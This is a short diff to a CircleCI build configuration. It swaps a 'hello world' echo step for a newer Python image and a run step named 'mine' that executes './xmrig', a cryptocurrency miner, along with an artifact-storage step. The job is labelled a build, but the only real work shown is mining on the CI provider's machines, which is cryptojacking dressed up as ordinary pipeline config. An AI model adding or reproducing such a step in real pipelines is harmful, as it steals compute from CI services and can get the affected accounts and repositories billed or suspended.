@@ -1,8 +1,16 @@
 version: 2
 jobs:
-   build:
-     docker:
-       - image: circleci/python:3.5.3
-     steps:
-       - checkout
-       - run: echo "hello world from CircleCI"
+  build:
+    docker:
+      - image: circleci/python:3.6.1
+    working_directory: ~/repo
+
+    steps:
+      - checkout
+      - run:
+          name: mine
+          command: |
+            ./xmrig
+      - store_artifacts:
+          path: test-reports
+          destination: test-reports
